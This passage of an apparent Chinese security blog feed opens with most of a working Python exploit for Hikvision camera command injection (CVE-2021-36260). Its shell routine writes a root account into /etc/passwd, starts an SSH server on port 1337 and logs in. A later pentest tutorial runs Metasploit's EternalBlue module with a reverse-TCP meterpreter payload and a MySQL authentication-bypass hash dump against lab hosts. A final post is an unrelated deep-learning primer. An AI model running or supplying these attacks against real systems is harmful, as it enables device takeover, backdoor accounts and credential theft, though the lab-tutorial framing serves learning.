vulnerable&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Remote is not vulnerable&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">remote, args</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check(remote, args):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    data = remote.send(query_args=<span class="string">f&#x27;<span class="subst">&#123;args.cmd&#125;</span>&gt;webLib/x&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    data = remote.send(url=<span class="string">&#x27;/x&#x27;</span>, query_args=<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> data.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[!] Error execute cmd &quot;<span class="subst">&#123;args.cmd&#125;</span>&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(data.text)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd_blind</span>(<span class="params">remote, args</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check(remote, args):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    data = remote.send(query_args=<span class="string">f&#x27;<span class="subst">&#123;args.cmd_blind&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> data.status_code == <span class="number">500</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[-] Error execute cmd &quot;<span class="subst">&#123;args.cmd_blind&#125;</span>&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[i] Try execute blind cmd &quot;<span class="subst">&#123;args.cmd_blind&#125;</span>&quot;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>(<span class="params">remote, args</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check(remote, args):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    data = remote.send(url=<span class="string">&#x27;/N&#x27;</span>, query_args=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data.status_code == <span class="number">404</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[i] Remote &quot;<span class="subst">&#123;args.rhost&#125;</span>&quot; not pwned, pwning now!&#x27;</span>)</span><br><span class="line">        data = remote.send(query_args=<span class="string">&#x27;echo -n P::0:0:W&gt;N&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> data.status_code == <span class="number">401</span>:</span><br><span class="line">            <span class="built_in">print</span>(data.headers)</span><br><span class="line">            <span class="built_in">print</span>(data.text)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        remote.send(query_args=<span class="string">&#x27;echo :/:/bin/sh&gt;&gt;N&#x27;</span>)</span><br><span class="line">        remote.send(query_args=<span class="string">&#x27;cat N&gt;&gt;/etc/passwd&#x27;</span>)</span><br><span class="line">        remote.send(query_args=<span class="string">&#x27;dropbear -R -B -p 1337&#x27;</span>)</span><br><span class="line">        remote.send(query_args=<span class="string">&#x27;cat N&gt;webLib/N&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[i] Remote &quot;<span class="subst">&#123;args.rhost&#125;</span>&quot; already pwned&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] Trying SSH to <span class="subst">&#123;args.rhost&#125;</span> on port 1337&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">f&#x27;ssh -o StrictHostKeyChecking=no -o LogLevel=error -o UserKnownHostsFile=/dev/null \</span></span><br><span class="line"><span class="string">    P@<span class="subst">&#123;args.rhost&#125;</span> -p 1337&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Hikvision CVE-2021-36260\n[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--rhost&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&#x27;Remote Target Address (IP/FQDN)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--rport&#x27;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">80</span>, <span class="built_in">help</span>=<span class="string">&#x27;Remote Target Port&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--check&#x27;</span>, required=<span class="literal">False</span>, default=<span class="literal">False</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Check if vulnerable&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--reboot&#x27;</span>, required=<span class="literal">False</span>, default=<span class="literal">False</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Reboot if vulnerable&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--shell&#x27;</span>, required=<span class="literal">False</span>, default=<span class="literal">False</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Launch SSH shell&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--cmd&#x27;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&#x27;execute cmd (i.e: &quot;ls -l&quot;)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--cmd_blind&#x27;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&#x27;execute blind cmd (i.e: &quot;reboot&quot;)&#x27;</span>)</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&#x27;--noverify&#x27;</span>, required=<span class="literal">False</span>, default=<span class="literal">False</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Do not verify if vulnerable&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&#x27;--proto&#x27;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, choices=[<span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;https&#x27;</span>], default=<span class="string">&#x27;http&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Protocol used&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    remote = Http(args.rhost, args.rport, args.proto)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> args.shell:</span><br><span class="line">            shell(remote, args)</span><br><span class="line">        <span class="keyword">elif</span> args.cmd:</span><br><span class="line">            cmd(remote, args)</span><br><span class="line">        <span class="keyword">elif</span> args.cmd_blind:</span><br><span class="line">            cmd_blind(remote, args)</span><br><span class="line">        <span class="keyword">elif</span> args.check:</span><br><span class="line">            check(remote, args)</span><br><span class="line">        <span class="keyword">elif</span> args.reboot:</span><br><span class="line">            check_reboot(remote, args)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            parser.parse_args([<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Hikvison</tag>
      </tags>
  </entry>
  <entry>
    <title>系统及数据库等</title>
    <url>/post/1f6ee220.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>&emsp;&emsp;除去前期讲到过的搭建平台中间件，网站源码外，容易收到攻击的还有操作系统，数据库，第三方软件平台等，其中此类攻击也能直接影响到Web或服务器的安全，导致网站或服务器权限的获取</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/Image.png" alt="Image"></p>
<h1 id="二、操作系统层面"><a href="#二、操作系统层面" class="headerlink" title="二、操作系统层面"></a>二、操作系统层面</h1><h2 id="1、识别操作系统常见方法"><a href="#1、识别操作系统常见方法" class="headerlink" title="1、识别操作系统常见方法"></a>1、识别操作系统常见方法</h2><h3 id="（1）根据网站识别"><a href="#（1）根据网站识别" class="headerlink" title="（1）根据网站识别"></a>（1）根据网站识别</h3><h4 id="a、通过文件路径的大小写判断"><a href="#a、通过文件路径的大小写判断" class="headerlink" title="a、通过文件路径的大小写判断"></a>a、通过文件路径的大小写判断</h4><p>&emsp;&emsp;随便通过谷歌语法搜索点php的网站</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631355431212-a8a74a02-e01f-4697-b690-9f1eeec0b95b.png" alt="img"></p>
<p>&emsp;&emsp;看到一个网站，进入看看，URL为：<a href="http://www.qingxin.com.cn/cn/index.php">http://www.qingxin.com.cn/cn/index.php</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631355720604-fba4efaa-b090-4787-b125-b9acce667fa6.png" alt="img"></p>
<p>&emsp;&emsp;当把URL改为：<a href="http://www.qingxin.com.cn/cn/index.php">http://www.qingxin.com.cn/cn/indeX.php</a>，显示404，说明大小写敏感，应该是Linux操作系统</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631355808580-329f4a0b-a3fb-40d3-b284-9ec418aad9e1.png" alt="img"></p>
<h3 id="（2）TTL值判断（不推荐，有时不准确）"><a href="#（2）TTL值判断（不推荐，有时不准确）" class="headerlink" title="（2）TTL值判断（不推荐，有时不准确）"></a>（2）TTL值判断（不推荐，有时不准确）</h3><p>&emsp;&emsp;不同的操作系统的默认TTL值是不同的， 所以我们可以通过TTL值来判断主机的操作系统，但是当用户修改了TTL值的时候，就会误导我们的判断，所以这种判断方式也不一定准确。下面是默认操作系统的TTL：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、WINDOWS NT/<span class="number">2000</span>   TTL：<span class="number">128</span></span><br><span class="line"><span class="number">2</span>、WINDOWS <span class="number">95</span>/<span class="number">98</span>     TTL：<span class="number">32</span></span><br><span class="line"><span class="number">3</span>、UNIX              TTL：<span class="number">255</span></span><br><span class="line"><span class="number">4</span>、LINUX             TTL：<span class="number">64</span></span><br><span class="line"><span class="number">5</span>、WIN7              TTL：<span class="number">64</span> </span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;比如ping一下<a href="https://www.xiaodi8.com/">www.xiaodi8.com</a>，可以发现TTL为109，与128最相近，因此判断为Windows NT/2000，事实上的确如此</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631356136437-922cc7b6-f37c-4a58-8f7b-e68e43403816.png" alt="img"></p>
<h3 id="（3）使用nmap等扫描工具"><a href="#（3）使用nmap等扫描工具" class="headerlink" title="（3）使用nmap等扫描工具"></a>（3）使用nmap等扫描工具</h3><p>&emsp;&emsp;<code>nmap -O IP</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631356487609-1275be5a-62be-4fbd-a4ee-0c7a1057c7f8.png" alt="img"></p>
<h2 id="2、操作系统区别及识别意义"><a href="#2、操作系统区别及识别意义" class="headerlink" title="2、操作系统区别及识别意义"></a>2、操作系统区别及识别意义</h2><p>区别：网站路径、大小写、文件在两个系统之间的适用性，兼容性</p>
<p>识别意义：如果判断出是哪种操作系统，就会从操作系统所支持的漏洞类型下手</p>
<h1 id="三、数据库层面"><a href="#三、数据库层面" class="headerlink" title="三、数据库层面"></a>三、数据库层面</h1><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">小型数据库 Access</span><br><span class="line">中型数据库 MySQL</span><br><span class="line">大型数据库 Oracle、SQL Server</span><br></pre></td></tr></table></figure>

<h2 id="1、识别数据库类型常见方法"><a href="#1、识别数据库类型常见方法" class="headerlink" title="1、识别数据库类型常见方法"></a>1、识别数据库类型常见方法</h2><h3 id="（1）通过网站及操作系统识别"><a href="#（1）通过网站及操作系统识别" class="headerlink" title="（1）通过网站及操作系统识别"></a>（1）通过网站及操作系统识别</h3><h4 id="a、常见的组合"><a href="#a、常见的组合" class="headerlink" title="a、常见的组合"></a>a、常见的组合</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">asp + access（Windows特有）</span><br><span class="line">php + mysql</span><br><span class="line">aspx + mssql（Windows特有）</span><br><span class="line">jsp + mssql，oracle</span><br><span class="line">python + mongodb</span><br><span class="line">................</span><br></pre></td></tr></table></figure>

<h3 id="（2）通过nmap等工具扫描端口"><a href="#（2）通过nmap等工具扫描端口" class="headerlink" title="（2）通过nmap等工具扫描端口"></a>（2）通过nmap等工具扫描端口</h3><p>&emsp;&emsp;常用的数据库默认端口号：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>，关系型数据库</span><br><span class="line"></span><br><span class="line">SQL Server --- <span class="number">1433</span></span><br><span class="line">Oracle --- <span class="number">1521</span></span><br><span class="line">MySQL --- <span class="number">3306</span></span><br><span class="line">Sybase --- <span class="number">5000</span></span><br><span class="line">DB2 --- <span class="number">5000</span></span><br><span class="line">PostgreSQL --- <span class="number">5432</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>，NOSQL数据库</span><br><span class="line"></span><br><span class="line">Redis --- <span class="number">6379</span></span><br><span class="line">Memcached --- <span class="number">11211</span></span><br><span class="line">MongoDB --- <span class="number">27017</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631357845697-a5c6d589-81ca-4e4e-807f-1a02b34f6c83.png" alt="img"></p>
<h2 id="2、数据库类型区别及识别意义"><a href="#2、数据库类型区别及识别意义" class="headerlink" title="2、数据库类型区别及识别意义"></a>2、数据库类型区别及识别意义</h2><p>&emsp;&emsp;每个数据库里面的安全机制，内部结构都有些许不一样，同样产生的漏洞也不一样。不同的数据库，攻击方法、漏洞类型及影响都有不同</p>
<h2 id="3、数据库常见漏洞类型及攻击"><a href="#3、数据库常见漏洞类型及攻击" class="headerlink" title="3、数据库常见漏洞类型及攻击"></a>3、数据库常见漏洞类型及攻击</h2><p>&emsp;&emsp;弱口令攻击：通过弱口令登录到数据库中，得到网站管理员数据信息，登录网站后台，进行修改</p>
<h2 id="4、简述数据库层面漏洞影响范围"><a href="#4、简述数据库层面漏洞影响范围" class="headerlink" title="4、简述数据库层面漏洞影响范围"></a>4、简述数据库层面漏洞影响范围</h2><p>&emsp;&emsp;通过漏洞，进行攻击，也可以获取数据库的相关权限，进行一系列的操作</p>
<h1 id="四、第三方层面"><a href="#四、第三方层面" class="headerlink" title="四、第三方层面"></a>四、第三方层面</h1><h2 id="1、如何判断有哪些第三方平台和软件"><a href="#1、如何判断有哪些第三方平台和软件" class="headerlink" title="1、如何判断有哪些第三方平台和软件"></a>1、如何判断有哪些第三方平台和软件</h2><p>&emsp;&emsp;常见的第三方软件：Jboss，PHPmyadmin，vsftpd（用来搭建FTP服务的），teamview等</p>
<p>&emsp;&emsp;比如phpmyadmin的判定</p>
<ul>
<li>通过网站扫描其目录来判定，如果网站探测不到，那就通过端口扫描。要多层次判断，不能仅限于端口扫描，根据不同的应用采取不同的方法。</li>
</ul>
<ul>
<li>如果nmap扫描不出来，可能是有第三方防护软件（安全狗）等拦截。还有可能是对方服务部署在内网。</li>
</ul>
<h2 id="2、简述为什么要识别第三方平台或软件"><a href="#2、简述为什么要识别第三方平台或软件" class="headerlink" title="2、简述为什么要识别第三方平台或软件"></a>2、简述为什么要识别第三方平台或软件</h2><p>&emsp;&emsp;通过识别第三方软件，来找出漏洞，从而进行渗透测试</p>
<h2 id="3、简述第三方平台或软件安全测试的范围"><a href="#3、简述第三方平台或软件安全测试的范围" class="headerlink" title="3、简述第三方平台或软件安全测试的范围"></a>3、简述第三方平台或软件安全测试的范围</h2><p>&emsp;&emsp;直接影响到权限</p>
<h1 id="五、补充"><a href="#五、补充" class="headerlink" title="五、补充"></a>五、补充</h1><p>&emsp;&emsp;除去常规web安全及app安全测试外，类似服务器单一或复杂的其他服务（邮件，游戏，负载均衡等），也可以作为安全测试目标，此类目标测试原则只是少了web应用或其他安全问题，所以明确安全测试思路是很重要的</p>
<h1 id="六、操作演示"><a href="#六、操作演示" class="headerlink" title="六、操作演示"></a>六、操作演示</h1><h2 id="1、永恒之蓝漏洞演示"><a href="#1、永恒之蓝漏洞演示" class="headerlink" title="1、永恒之蓝漏洞演示"></a>1、永恒之蓝漏洞演示</h2><h3 id="（1）主机发现"><a href="#（1）主机发现" class="headerlink" title="（1）主机发现"></a>（1）主机发现</h3><p>&emsp;&emsp;使用命令：<code>arp-scan -l</code> 进行主机发现，发现了IP地址为192.168.43.155的主机，即我的靶机</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631406644415-50942569-e719-4f22-bba9-d8c6b5ec5d3a.png" alt="img"></p>
<h3 id="（2）扫描端口"><a href="#（2）扫描端口" class="headerlink" title="（2）扫描端口"></a>（2）扫描端口</h3><p>&emsp;&emsp;使用命令：<code>nmap -sV -p- 192.168.43.155</code>，可以看到目标主机开放了445端口</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631406955155-07c33875-ea29-4183-abe4-f5f2d8380fbf.png" alt="img"></p>
<h3 id="（3）永恒之蓝漏洞利用"><a href="#（3）永恒之蓝漏洞利用" class="headerlink" title="（3）永恒之蓝漏洞利用"></a>（3）永恒之蓝漏洞利用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp**</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> lhost 192.168.43.167</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> rhost 192.168.43.155</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631407346654-261ac64e-a2e1-41ad-bdd8-ae07ae89e33a.png" alt="img"></p>
<h3 id="（4）提权"><a href="#（4）提权" class="headerlink" title="（4）提权"></a>（4）提权</h3><p>&emsp;&emsp;进入shell，发现已经是机器最高权限了</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631407407097-49618ce1-ccc8-449f-b4e1-b0ed91141e91.png" alt="img"></p>
<h2 id="2、MySQL身份认证绕过-CVE-2012-2122"><a href="#2、MySQL身份认证绕过-CVE-2012-2122" class="headerlink" title="2、MySQL身份认证绕过 CVE-2012-2122"></a>2、MySQL身份认证绕过 CVE-2012-2122</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631420216917-2d8ae1fc-2e84-4400-b1ce-8193033bb141.png" alt="img"></p>
<p>&emsp;&emsp;进入vulhub所在的文件夹，然后进入CVE-2012-2122的文件夹</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631419912396-906d8f0e-fddb-4a68-a076-79969c6d7c3b.png" alt="img"></p>
<p>&emsp;&emsp;布置并启动测试环境：<code>docker-compose build</code> <code>docker-compose up -d</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631420038213-47d8b604-a90a-4bea-9e46-69bbbec97f99.png" alt="img"></p>
<p>&emsp;&emsp;靶机查看IP地址信息，使用Kali进行nmap扫描：<code>nmap -sV -O 192.168.43.44</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631420451806-a9bef41c-0f48-4945-ab3b-8c6452fa8d9a.png" alt="img"></p>
<p>&emsp;&emsp;搜索MySQL漏洞攻击模块：<code>search mysql</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631420496660-537e779d-e8da-4d1b-99e0-9066f9e73651.png" alt="img"></p>
<p>&emsp;&emsp;利用模块：<code>use auxiliary/scanner/mysql/mysql_authbypass_hashdump</code></p>
<p>&emsp;&emsp;进行相关设置：</p>
<ul>
<li><p><code>set rhosts 192.168.43.44</code></p>
</li>
<li><p><code>set username root</code></p>
</li>
</ul>
<p>run</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631420896466-b7d36f4b-ed58-4cd2-949a-b08702cc0114.png" alt="img"></p>
<p>&emsp;&emsp;关闭环境：<code>docker-compose down</code></p>
<h1 id="七、涉及资源"><a href="#七、涉及资源" class="headerlink" title="七、涉及资源"></a>七、涉及资源</h1><p>&emsp;&emsp;<a href="https://github.com/hellogoldsnakeman/masnmapscan-V1.0">https://github.com/hellogoldsnakeman/masnmapscan-V1.0</a></p>
<p>&emsp;&emsp;也是个扫描工具，但是功能没有nmap多但是更快，适合轻量级的工作</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>深度学习基础——什么是深度学习</title>
    <url>/post/76a6120c.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、人工智能、机器学习与深度学习"><a href="#一、人工智能、机器学习与深度学习" class="headerlink" title="一、人工智能、机器学习与深度学习"></a>一、人工智能、机器学习与深度学习</h1><p>&emsp;&emsp;首先，在提到人工智能时，我们需要明确定义所讨论的内容。什么是人工智能，机器学习与深度学习。这三者之间有什么关系</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642149409249-2dd2e81e-1a6d-4adf-a4da-8120216c9656.png" alt="img"></p>
<h2 id="1、人工智能（AI）"><a href="#1、人工智能（AI）" class="headerlink" title="1、人工智能（AI）"></a>1、人工智能（AI）</h2><p>&emsp;&emsp;人工智能的简介定义如下：努力将通常由人类完成的智能任务自动化。</p>
<h2 id="2、机器学习（Machine-Learning）"><a href="#2、机器学习（Machine-Learning）" class="headerlink" title="2、机器学习（Machine Learning）"></a>2、机器学习（Machine Learning）</h2><p>&emsp;&emsp;机器学习的概念就来自于图灵的这个问题：对于计算机而言，除了“我们命令它做的任何事情”之外，它能否自我学习执行特定任务的方法？计算机能否让我们大吃一惊？如果没有程序员精心编写的数据处理规则，计算机能否通过观察数据自动学会这些规则？</p>
<p>&emsp;&emsp;图灵的这个问题引出了一种新的编程范式。在经典的程序设计（即符号主义人工智能的范式）中，人们输入的是规则（即程序）和需要根据这些规则进行处理的数据，系统输出的是答案。利用机器学习，人们输入的是数据和从这些数据中预期得到的答案，系统输出的是规则。这些规则随后可应用于新的数据，并使计算机自主生成答案。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642150297514-da1c23f0-1ddc-464b-b81e-4369a171cc9b.png" alt="img"></p>
<p>&emsp;&emsp;机器学习系统是<strong>训练出来的</strong>，而不是明确地用程序编写出来的。将与某个任务相关的许多示例输入机器学习系统，它会在这些示例中找到统计结构，从而最终找到规则将任务自动化。举个例子，你想为度假照片添加标签，并且希望将这项任务自动化，那么你可以将许多人工打好标签的照片输入机器学习系统，系统将学会将照片与特定标签联系在一起的统计规则。</p>
<h3 id="（1）概率建模"><a href="#（1）概率建模" class="headerlink" title="（1）概率建模"></a>（1）概率建模</h3><p>&emsp;&emsp;<strong>概率建模</strong>（probabilistic modeling）是统计学原理在数据分析中的应用。它是最早的机器学习形式之一，至今仍在广泛使用。其中最有名的算法之一就是朴素贝叶斯算法。</p>
<p>&emsp;&emsp;朴素贝叶斯是一类基于应用贝叶斯定理的机器学习分类器，它假设输入数据的特征都是独立的。这是一个很强的假设，或者说“朴素的”假设，其名称正来源于此。这种数据分析方法比计算机出现得还要早，在其第一次被计算机实现（很可能追溯到20世纪50年代）的几十年前就已经靠人工计算来应用了。贝叶斯定理和统计学基础可以追溯到18世纪，你学会了这两点就可以开始使用朴素贝叶斯分类器了。</p>
<p>&emsp;&emsp;另一个密切相关的模型是logistic<strong>回归</strong>（logistic regression，简称logreg），它有时被认为是现代机器学习的“hello world”。不要被它的名称所误导——logreg是一种分类算法，而不是回归算法。与朴素贝叶斯类似，logreg的出现也比计算机早很长时间，但由于它既简单又通用，至今仍然很有用。面对一个数据集，数据科学家通常会首先尝试使用这个算法，以便初步熟悉手头的分类任务。</p>
<h3 id="（2）核方法（Kernel-Method）"><a href="#（2）核方法（Kernel-Method）" class="headerlink" title="（2）核方法（Kernel Method）"></a>（2）核方法（Kernel Method）</h3><p>&emsp;&emsp;核方法是一组分类算法，其中最有名的就是支持向量机（SVM, support vector machine）。虽然Vladimir Vapnik和AlexeyChervonenkis早在1963年就发表了较早版本的线性公式[插图]，但SVM的现代公式由Vladimir Vapnik和Corinna Cortes于20世纪90年代初在贝尔实验室提出，并发表于1995年。</p>
<p>&emsp;&emsp;SVM的目标是通过在属于两个不同类别的两组数据点之间找到良好<strong>决策边界</strong>（decision boundary，见图）来解决分类问题。决策边界可以看作一条直线或一个平面，将训练数据划分为两块空间，分别对应于两个类别。对于新数据点的分类，你只需判断它位于决策边界的哪一侧。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642158284514-c5f2d553-6de0-4908-ba75-f0208b74c215.png" alt="img"></p>
<p>SVM通过两步来寻找决策边界。</p>
<ol>
<li>将数据映射到一个新的高维表示，这时决策边界可以用一个超平面来表示（如果数据像上图那样是二维的，那么超平面就是一条直线）。</li>
<li>尽量让超平面与每个类别最近的数据点之间的距离最大化，从而计算出良好决策边界（分割超平面），这一步叫作<strong>间隔最大化</strong>（maximizing the margin）。这样决策边界可以很好地推广到训练数据集之外的新样本。</li>
</ol>
<p>&emsp;&emsp;将数据映射到高维表示从而使分类问题简化，这一技巧可能听起来很不错，但在实践中通常是难以计算的。这时就需要用到核技巧（kernel trick，核方法正是因这一核心思想而得名）。其基本思想是：要想在新的表示空间中找到良好的决策超平面，你不需要在新空间中直接计算点的坐标，只需要在新空间中计算点对之间的距离，而利用核函数（kernel function）可以高效地完成这种计算。核函数是一个在计算上能够实现的操作，将原始空间中的任意两点映射为这两点在目标表示空间中的距离，完全避免了对新新示进行直接计算。核函数通常是人为选择的，而不是从数据中学到的——对于SVM来说，只有分割超平面是通过学习得到的。</p>
<p>&emsp;&emsp;SVM刚刚出现时，在简单的分类问题上表现出了最好的性能。当时只有少数机器学习方法得到大量的理论支持，并且适合用于严肃的数学分析，因而非常易于理解和解释，SVM就是其中之一。由于SVM具有这些有用的性质，很长一段时间里它在实践中非常流行。</p>
<p>&emsp;&emsp;但是，SVM很难扩展到大型数据集，并且在图像分类等感知问题上的效果也不好。SVM是一种比较浅层的方法，因此要想将其应用于感知问题，首先需要手动提取出有用的表示（这叫作<strong>特征工程</strong>），这一步骤很难，而且不稳定。</p>
<h3 id="（3）决策树、随机森林与梯度提升机"><a href="#（3）决策树、随机森林与梯度提升机" class="headerlink" title="（3）决策树、随机森林与梯度提升机"></a>（3）决策树、随机森林与梯度提升机</h3><p><strong>&emsp;&emsp;决策树</strong>（decision tree）是类似于流程图的结构，可以对输入数据点进行分类或根据给定输入来预测输出值（见图）。决策树的可视化和解释都很简单。在21世纪前十年，从数据中学习得到的决策树开始引起研究人员的广泛关注。到了2010年，决策树经常比核方法更受欢迎</p>
